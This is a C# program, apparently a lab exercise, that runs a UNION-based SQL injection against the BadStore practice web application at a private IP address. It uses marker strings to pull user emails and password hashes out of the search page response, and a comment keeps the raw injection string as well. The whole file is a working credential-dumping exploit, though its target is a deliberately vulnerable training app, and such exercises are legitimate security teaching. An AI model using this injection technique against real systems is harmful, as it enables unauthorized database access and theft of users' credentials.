using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Text.RegularExpressions;

namespace asemoncms3
{
    class MainClass
    {
        public static void Main()
        {
            string fMarker = "BaSaExE";
            string mMarker = "eXeSsAb";
            string eMarker = "EXeBAsS";
            string fHex = string.Join("", fMarker.ToCharArray().Select(c => ((int)c).ToString("X2")));
            string mHex = string.Join("", mMarker.ToCharArray().Select(c => ((int)c).ToString("X2")));
            string eHex = string.Join("", eMarker.ToCharArray().Select(c => ((int)c).ToString("X2")));

            Console.WriteLine($"{fMarker}, {mMarker}, {eMarker}\n{fHex}, {mHex}, {eHex}");

            string badStoreAddy = "172.16.1.129";
            string URL = "http://"+badStoreAddy+"/cgi-bin/badstore.cgi";
            //+UNION+ALL+SELECT+NULL,+NULL,+CONCAT(0x7176627171,+email,+0x776872786573,passwd,0x71766b7671),+NULL+FROM+badstoredb.userdb%23&action=search&x=0&y=0
            string unionPayload = "Snake Oil' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x" + fHex + ",IFNULL(CAST(email AS CHAR),0x20),0x" + mHex + ",IFNULL(CAST(passwd as CHAR),0x20),0x" + eHex + ") FROM badstoredb.userdb-- ";
            URL += "?searchquery=" + Uri.EscapeUriString(unionPayload) + "&action=search";

            Console.WriteLine($"{URL}");
            HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(URL);

            string httpWebResponse = string.Empty;
            using (StreamReader reader = new StreamReader(httpWebRequest.GetResponse ().GetResponseStream()))
                httpWebResponse = reader.ReadToEnd();

            Regex payloadRegex = new Regex(fMarker + "(.*?)" + mMarker + "(.*?)" + eMarker);
            MatchCollection matches = payloadRegex.Matches(httpWebResponse);

            foreach (Match match in matches)
                Console.WriteLine($"Username: {match.Groups[1].Value}\t Password hash: {match.Groups[2].Value}");

        }
    }
}
